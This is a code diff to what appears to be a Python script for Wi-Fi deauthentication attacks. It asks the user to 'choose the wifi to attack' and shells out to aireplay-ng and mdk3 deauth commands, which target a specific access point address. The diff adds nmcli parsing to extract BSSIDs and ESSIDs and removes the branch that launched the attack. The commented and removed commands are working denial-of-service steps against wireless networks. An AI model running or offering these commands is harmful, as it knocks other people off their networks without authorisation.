@@ -5,6 +5,9 @@ import string
 #########################
 #aireplay-ng -0 0 -a CC:B2:55:FD:41:DA wlan0mon
 #mdk3 wlan0mon d -n "Hooop"
+#| awk '{print FS2 $2}
+#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card | awk '{print FS2 $2}' | sed '2p; d' (BSSID)
+#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS2 $7}' | sed '2p; d' (ESSID)
 ###########################
 
 
@@ -41,10 +44,7 @@ os.system('card=`cat card.sh` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,S
 print("")
 
 choose=raw_input("Choose the wifi to attack: ")
-if way == 1:
-  os.system('card=`cat card.sh` && mdk3 wlan0mon d -n '+str(choose)+'')
-else:
-  os.system('card=`cat card.sh` && aireplay-ng -0 0 ')
+
 
 print("Return configurations: ")
 os.system('card=`cat card.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
